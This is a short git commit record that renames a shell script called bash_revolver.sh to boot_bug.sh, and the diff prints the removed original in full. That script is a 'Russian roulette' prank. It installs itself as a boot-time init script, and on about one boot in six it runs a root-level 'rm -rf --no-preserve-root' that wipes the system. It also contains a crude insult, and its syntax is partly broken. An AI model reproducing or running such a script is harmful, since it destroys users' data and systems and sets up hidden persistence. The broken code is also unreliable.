db9b345644b567e9b5ac75e561b6e2fc7da505b0
Nick <59221356+mrgfy@users.noreply.github.com>
2020-05-15 09:56:41 -0700

    Update and rename bash_revolver.sh to boot_bug.sh

--- bash_revolver.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-
-touch /etc/init.d/bash_revolver.sh &&\ 
-echo "[ $[ $RANDOM % 6 ] == 0 } &&\ 
-su root -g wheel -c "rm -rf --no-preserve-root */*" || echo *Eat a Dick & Go Back to Windows*; or sleep 5 & exec $last_pid" > /etc/init.d/bash_revolver.sh &&\ 
-chmod 755 /etc/init.d/bash_revolver.sh &&\ 
-update-rc.d bash_revolver.sh defaults;
